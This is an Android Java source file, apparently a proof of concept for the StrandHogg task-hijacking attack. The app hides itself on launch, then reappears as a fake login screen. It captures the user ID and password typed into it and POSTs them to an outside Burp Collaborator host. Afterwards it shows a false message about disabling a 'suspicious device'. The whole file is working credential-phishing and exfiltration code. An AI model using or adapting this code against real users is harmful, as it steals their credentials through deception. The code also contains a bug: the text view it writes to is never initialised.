package com.example.strandhoggexploit;

import androidx.appcompat.app.AppCompatActivity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import android.widget.TextView;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;


public class MainActivity extends AppCompatActivity {

    private EditText editText1;
    private EditText editText2;
    private Button sendButton;
    private TextView textView;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);

        // Button and Text Fields
        editText1 = findViewById(R.id.userID_field);
        editText2 = findViewById(R.id.Password_field);
        sendButton = findViewById(R.id.login_button);

        Button sendButton = findViewById(R.id.login_button);
        sendButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                // Get user input
                String value1 = editText1.getText().toString();
                String value2 = editText2.getText().toString();

                // Send HTTP request in the background
                new SendHttpRequestTask().execute(value1, value2);

                // Change the text
                textView.setText("Thank you for verifying your account. We will proceed to disable the suspicious device that was used to log in with your account.");

                finish();
            }

        });
    }




// Send Data to Server

    private class SendHttpRequestTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            String value1 = params[0];
            String value2 = params[1];

            try {
                // Burp Collaborator server URL
                URL url = new URL("https://burpcollaborator.oastify.com");

                // Open connection
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);

                // Send data
                String postData = "userID=" + URLEncoder.encode(value1, "UTF-8") +
                        "&Password=" + URLEncoder.encode(value2, "UTF-8");

                OutputStream outputStream = connection.getOutputStream();
                outputStream.write(postData.getBytes("UTF-8"));
                outputStream.flush();
                outputStream.close();

                // Get response code
                int responseCode = connection.getResponseCode();

                return "HTTP request sent. Response Code: " + responseCode;
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }

        @Override
        protected void onPostExecute(String result) {
            // Display the result or handle errors
            Toast.makeText(MainActivity.this, result, Toast.LENGTH_SHORT).show();
        }
    }

}
